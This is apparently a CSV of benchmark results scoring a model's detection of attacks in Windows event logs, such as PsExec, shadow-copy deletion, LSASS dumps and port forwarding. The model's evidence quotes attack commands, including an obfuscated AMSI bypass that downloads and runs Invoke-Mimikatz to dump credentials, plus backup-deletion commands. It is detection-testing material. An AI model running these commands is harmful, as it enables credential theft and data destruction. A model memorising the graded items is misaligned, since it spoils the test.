# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,"ID4688,4697,5140-5145 PSexec remote execution + admin share.evtx",easy,A,processed,YES,100.0,66.7,YES,"4624, 5140, 5145, 4674, 4697, 4688","PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\services.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe","admmig, SRVDEFENDER01$, LocalSystem, demo\admmig","C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",10.23.42.22,,0.0,8.06,4.0,6.0,4.0,4,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5140, 5145, 4674, 4697, 4688
- Processes: PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\services.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$, LocalSystem, demo\admmig
- Commands: C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
- Network: 10.23.42.22
- Registry: None

EXPLANATION:
This is a classic PsExec remote lateral movement attack: an admin account (admmig) performs a network logon from 10.23.42.22, writes PSEXESVC.exe to the ADMIN$ share, installs and starts a LocalSystem service (PSEXESVC), and spawns cmd.exe with credentials passed in cleartext on the command line (-u demo\admmig -p Admin1235). The subsequent reconnaissance commands (whoami, hostname) executed under the PSEXESVC-spawned cmd.exe confirm hands-on-keyboard activity consistent with remote code execution rather than routine administration."
claude-opus-4-8,ID13-RDP shadow session configuration enabled (registry).evtx,easy,A,processed,YES,100.0,88.9,YES,12,reg.exe,,,,HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services,0.0,4.48,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 12
- Processes: reg.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services

EXPLANATION:
The event shows reg.exe creating a key under the Terminal Services policy path, tagged with RDP technique T1076 (Remote Desktop Protocol). Using reg.exe to modify RDP-related policy registry keys is consistent with an attacker enabling or weakening Remote Desktop settings to establish remote access. This deliberate registry manipulation of remote-access policy on a file server is indicative of malicious persistence/lateral-movement preparation."
claude-opus-4-8,ID5600-proxy configuration changed.evtx,easy,A,processed,YES,100.0,71.4,YES,5600,,,,"http://hacker-proxy.lan:123, http://hacker-bypass.com/, http://internal.lan;<local>",,0.0,4.55,4.3,6.0,4.0,3,17.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5600
- Processes: None
- Accounts: None
- Commands: None
- Network: http://hacker-proxy.lan:123, http://hacker-bypass.com/, http://internal.lan;<local>
- Registry: None

EXPLANATION:
A rapid series of WinINet proxy configuration changes redirects traffic to an external proxy (hacker-proxy.lan:123) and sets a suspicious auto-config (PAC) URL (hacker-bypass.com), which are classic indicators of traffic interception/redirection for man-in-the-middle or exfiltration. The repeated, escalating modifications including proxy bypass rules within minutes strongly suggest attacker-driven tampering rather than normal user configuration."
claude-opus-4-8,ID4688-netsh RDP port forwarding abuse.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4964, 4672, 4624, 4627","C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe","admmig, OFFSEC, FS01$","netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset","0.0.0.0, 3389, 1.1.1.1, 127.0.0.1, 10.23.23.9",,0.0,7.68,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4964, 4672, 4624, 4627
- Processes: C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig, OFFSEC, FS01$
- Commands: netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset
- Network: 0.0.0.0, 3389, 1.1.1.1, 127.0.0.1, 10.23.23.9
- Registry: None

EXPLANATION:
The log begins with Event 1102 (audit log cleared) followed by the admmig account using netsh portproxy to forward traffic, including redirecting external connections to RDP (port 3389) and internal port 80, which is a common pivoting/tunneling technique (MITRE T1090). This is paired with Event 4964 (special groups logon), 4672 with extensive sensitive privileges (SeDebugPrivilege, SeImpersonatePrivilege, etc.), and a remote network logon from 10.23.23.9 with high-privilege group membership including Domain/Enterprise Admins (RIDs 512/519). The combination of log clearing, privilege escalation, and port-forwarding for RDP strongly indicates malicious lateral movement activity."
claude-opus-4-8,ID4688-Delete VSS backup (WMI).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe","admmig, FS03$","wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv",,,0.0,5.66,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, FS03$
- Commands: wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv
- Network: None
- Registry: None

EXPLANATION:
The account admmig executed ""wmic shadowcopy delete /nointeractive"", which deletes all Volume Shadow Copies to prevent file/system recovery — a hallmark of ransomware and anti-recovery techniques (MITRE T1490). The subsequent invocation of VSSVC.exe and the swprv service is the system responding to the shadow copy deletion request, confirming the destructive operation. Legitimate administrators rarely silently purge all shadow copies, making this strong evidence of malicious activity."
claude-opus-4-8,ID4688-Delete Window backup (webadmin).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe","admmig, FS03$","wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding",,,0.0,5.09,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
- Accounts: admmig, FS03$
- Commands: wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding
- Network: None
- Registry: None

EXPLANATION:
The audit log was cleared (Event 1102) immediately before the account admmig executed wbadmin to delete existing backups (-deleteOldest), a classic anti-recovery / backup-destruction technique used by ransomware and intrusion actors to prevent restoration. The combination of log clearing followed seconds later by backup deletion indicates deliberate defense evasion and impact, not routine maintenance."
claude-opus-4-8,ID800-4103-4104-Delete VSS backup (PowerShell).evtx,easy,A,processed,YES,100.0,91.7,YES,"800, 4104, 4103",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete() | },,,0.0,4.26,5.5,6.0,4.0,4,19.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
- Network: None
- Registry: None

EXPLANATION:
The command Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();} enumerates and deletes all Volume Shadow Copies, which is a hallmark anti-recovery technique used by ransomware to prevent file restoration. This deliberate destruction of backups via PowerShell by OFFSEC\admmig on host FS03 is a malicious defense-evasion/impact action, not routine administration."
claude-opus-4-8,ID4728-4756-Member added to sensitive domain groups.evtx,easy,A,processed,YES,100.0,92.9,YES,"4728, 4756",,"lambda-user, honey-pot1, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins",,,,0.0,4.19,5.6,6.0,4.0,4,19.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4728, 4756
- Processes: None
- Accounts: lambda-user, honey-pot1, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Within the same second, the account lambda-user added the member honey-pot1 to four highly privileged groups: Domain Admins (4728), Enterprise Admins, Enterprise Key Admins, and Schema Admins (4756). This rapid, sequential escalation across all top-tier privileged groups by a single non-admin actor is a hallmark of privilege escalation/persistence, and the addition to a ""honey-pot"" object strongly indicates malicious activity caught by deception monitoring."
claude-opus-4-8,ID4103-4104-CrackMapExec payload execution.evtx,medium,A,processed,YES,100.0,61.5,YES,"4104, 4103",powershell.exe,OFFSEC\admmig,"powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X') | Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true) | IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1') | $cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'",10.23.123.11,,0.0,9.01,3.7,6.0,4.0,3,16.7,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4104, 4103
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X'); [Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true); IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1'); $cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
- Network: 10.23.123.11
- Registry: None

EXPLANATION:
The PowerShell command uses heavy obfuscation (char-code arrays, string splitting, case-randomized cmdlets) launched with execution-bypass flags, then attempts AMSI bypass via SetValue on amsiInitFailed before downloading and executing Invoke-Mimikatz from a remote host to dump credentials (sekurlsa::logonpasswords). This combination of AMSI tampering, remote payload download, and credential theft is clearly malicious; antivirus blocked the script as containing malicious content."
claude-opus-4-8,ID11-LSASS credentials dump via Task Manager.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\System32\Taskmgr.exe,admmig,,,,0.0,4.17,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 11
- Processes: C:\Windows\System32\Taskmgr.exe
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Task Manager (Taskmgr.exe) created a file named ""lsass (4).DMP"" in the user's Temp directory, which is a memory dump of the LSASS process. Dumping LSASS memory is a well-known credential-theft technique (MITRE T1003.001) used to extract password hashes and credentials. The ""(4)"" suffix suggests repeated dumping attempts, further indicating deliberate malicious activity rather than routine troubleshooting."
claude-opus-4-8,ID6004-DNS-server-failed zone transfer.evtx,easy,A,processed,YES,100.0,100.0,YES,6004,,,,"10.23.23.9, non-existing.lan., google.com., hacking-zone.lan., rootdc1.offsec.lan",,0.0,3.93,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 6004
- Processes: None
- Accounts: None
- Commands: None
- Network: 10.23.23.9, non-existing.lan., google.com., hacking-zone.lan., rootdc1.offsec.lan
- Registry: None

EXPLANATION:
A single client (10.23.23.9) is generating rapid successive DNS queries for non-existent and suspicious domains (non-existing.lan., hacking-zone.lan.) within seconds, consistent with DNS reconnaissance or enumeration activity against the domain controller. The Event ID 6004 entries indicate the DNS server received malformed or noteworthy query packets, and the mix of failed/odd lookups from one host suggests scanning rather than normal name resolution."
claude-opus-4-8,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,81.7,YES,"1102, 4688, 4648, 4624, 4672","C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe",::1,,0.0,6.39,4.9,6.0,4.0,4,18.9,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4624, 4672
- Processes: C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe
- Accounts: admmig, hack1, FS03$
- Commands: runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
- Network: ::1
- Registry: None
- 

EXPLANATION:
The sequence begins with Event 1102 (Security audit log cleared), a classic anti-forensic/defense-evasion action, immediately followed by admmig using runas to spawn cmd.exe as a different account ""hack1"". The hack1 logon (4624 type 2) is granted highly sensitive privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege via 4672), indicating privilege escalation. The combination of log clearing followed by a privileged credential switch and process chain is strongly indicative of malicious activity."
claude-opus-4-8,ID4688-5145-WMIexec execution via SMB.evtx,easy,A,processed,YES,100.0,75.0,YES,"1102, 4964, 4672, 4624, 4688, 4674, 5140, 5145","C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","admmig, LOCAL SERVICE, FS03VULN$","cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619090610.0007844 2>&1, cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619090610.0007844 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff","10.23.23.9, 10.23.123.11, 127.0.0.1",,0.0,17.63,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4964, 4672, 4624, 4688, 4674, 5140, 5145
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: admmig, LOCAL SERVICE, FS03VULN$
- Commands: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619090610.0007844 2>&1, cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1619090610.0007844 2>&1, \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 10.23.23.9, 10.23.123.11, 127.0.0.1
- Registry: None

EXPLANATION:
The sequence opens with Event 1102 (audit log cleared) immediately followed by privileged Kerberos/NTLM Type 3 logons for admmig and SMBexec-style remote command execution: cmd.exe writing output to \\127.0.0.1\ADMIN$\__<timestamp> redirected via 2>&1, a hallmark of Impacket smbexec. Subsequent massive 5140/5145 share access from 10.23.23.9 enumerates C$ and exfiltrates ""SMB exec.evtx"" from the admmig Desktop, indicating remote lateral movement and data theft. The log-clearing, ADMIN$ command relay, and bulk remote file access together constitute clear malicious attacker behavior."
